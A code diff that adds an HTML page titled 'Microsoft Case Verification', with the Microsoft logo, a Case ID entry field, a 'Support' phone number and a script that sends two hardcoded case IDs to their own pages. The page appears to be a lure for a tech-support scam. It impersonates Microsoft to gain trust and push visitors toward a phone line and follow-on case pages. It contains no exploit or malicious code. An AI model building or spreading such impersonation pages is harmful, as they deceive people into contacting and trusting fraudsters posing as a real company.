@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Microsoft Case Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      text-align: center;
+      padding-top: 80px;
+    }
+    .container {
+      background-color: white;
+      padding: 40px;
+      border-radius: 10px;
+      display: inline-block;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    input, button {
+      padding: 10px;
+      font-size: 16px;
+      width: 250px;
+      margin: 10px 0;
+    }
+    img.logo {
+      width: 180px;
+      margin-bottom: 30px;
+    }
+    .support {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
+    <h2>Case ID Verification</h2>
+    <input type="text" id="caseId" placeholder="Enter Case ID">
+    <br>
+    <button onclick="verifyCase()">Continue</button>
+    <div class="support">
+      Support: +1 206 279 9715
+    </div>
+  </div>
+
+  <script>
+    function verifyCase() {
+      const caseId = document.getElementById("caseId").value.trim();
+      if (caseId === "587976") {
+        window.location.href = "case-587976.html";
+      } else if (caseId === "675223") {
+        window.location.href = "case-675223.html";
+      } else {
+        alert("Invalid Case ID. Please try again.");
+      }
+    }
+  </script>
+</body>
+</html>
